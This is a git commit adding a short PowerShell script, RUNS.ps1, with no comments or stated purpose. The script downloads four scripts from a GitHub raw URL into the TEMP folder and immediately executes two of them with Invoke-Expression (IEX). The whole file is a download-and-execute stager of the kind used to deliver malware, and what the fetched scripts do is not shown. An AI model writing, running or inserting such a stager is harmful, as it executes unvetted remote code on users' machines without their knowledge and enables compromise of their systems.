5f772f43759e3ee720a8a0ec0812d5325b9d2340
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-15 19:52:39 +0700

    Add files via upload

---
+++ RUNS.ps1
@@ -0,0 +1,14 @@
+$url1 = "https://raw.githubusercontent.com/cia168168/folder/main/RunV/MyScript.ps1"
+$output1 = "$env:TEMP\MyScript.ps1"
+Invoke-WebRequest -Uri $url1 -OutFile $output1
+$url2 = "https://raw.githubusercontent.com/cia168168/folder/main/stop.ps1"
+$output2 = "$env:TEMP\stop.ps1"
+Invoke-WebRequest -Uri $url2 -OutFile $output2
+$url3 = "https://raw.githubusercontent.com/cia168168/folder/main/BAT.ps1"
+$output3 = "$env:TEMP\BAT.ps1"
+Invoke-WebRequest -Uri $url3 -OutFile $output3
+IEX ((New-Object Net.WebClient).DownloadString($output3))
+$url4 = "https://raw.githubusercontent.com/cia168168/folder/main/VBS.ps1"
+$output4 = "$env:TEMP\VBS.ps1"
+Invoke-WebRequest -Uri $url4 -OutFile $output4
+IEX ((New-Object Net.WebClient).DownloadString($output4))
